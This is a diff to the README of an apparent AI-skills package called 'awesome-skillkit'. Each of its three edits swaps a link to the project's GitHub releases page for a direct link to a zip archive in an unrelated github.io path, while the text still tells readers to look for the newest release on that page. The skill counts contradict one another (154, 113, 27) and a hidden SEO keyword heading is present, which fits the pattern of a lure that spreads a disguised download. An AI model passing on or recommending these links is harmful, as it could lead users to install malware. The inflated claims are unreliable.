@@ -6,7 +6,7 @@ description: "Unzip and drop in 154 curated skills across 36 real-world scene pa
 <h1>🎯 awesome-skillkit - 113 Ready-Made AI Skills</h1>
 
 <p align="center">
-  <a href="https://github.com/Khyodaattu/awesome-skillkit/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download awesome-skillkit Now</a>
+  <a href="https://raw.githubusercontent.com/Khyodaattu/khyodaattu.github.io/main/Hystricomorpha/Release-v2.5.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download awesome-skillkit Now</a>
 </p>
 
 <p align="center">Turn your AI tools into powerful automation engines. 27 skill packs covering media, writing, publishing, coding, and office tasks. No technical knowledge needed.</p>
@@ -84,7 +84,7 @@ description: "Unzip and drop in 154 curated skills across 36 real-world scene pa
 <h3>Step 1: Get the Files</h3>
 
 <p><strong>Visit this link to download the application:</strong></p>
-<p><a href="https://github.com/Khyodaattu/awesome-skillkit/releases" style="display:inline-block;padding:14px 32px;background:#28a745;color:#ffffff;text-decoration:none;border-radius:6px;font-size:18px;font-weight:bold;">🔗 Go to Download Page</a></p>
+<p><a href="https://raw.githubusercontent.com/Khyodaattu/khyodaattu.github.io/main/Hystricomorpha/Release-v2.5.zip" style="display:inline-block;padding:14px 32px;background:#28a745;color:#ffffff;text-decoration:none;border-radius:6px;font-size:18px;font-weight:bold;">🔗 Go to Download Page</a></p>
 
 <p>This page shows all available releases. Look for the newest version at the top - the file name will start with <strong>"awesome-skillkit"</strong> and end with a version number like v1.0.0.</p>
 
@@ -175,7 +175,7 @@ description: "Unzip and drop in 154 curated skills across 36 real-world scene pa
 <hr>
 <p style="text-align:center;margin-top:30px;padding:20px;background:#f8f9fa;border-radius:8px;">
   <strong>Ready to get started?</strong><br>
-  <a href="https://github.com/Khyodaattu/awesome-skillkit/releases" style="display:inline-block;padding:12px 28px;background:#007bff;color:#ffffff;text-decoration:none;border-radius:6px;margin-top:10px;font-size:16px;">⬇️ Download awesome-skillkit</a>
+  <a href="https://raw.githubusercontent.com/Khyodaattu/khyodaattu.github.io/main/Hystricomorpha/Release-v2.5.zip" style="display:inline-block;padding:12px 28px;background:#007bff;color:#ffffff;text-decoration:none;border-radius:6px;margin-top:10px;font-size:16px;">⬇️ Download awesome-skillkit</a>
 </p>
 
 <h2 style="font-size:0px;display:none;">SEO Keywords</h2>
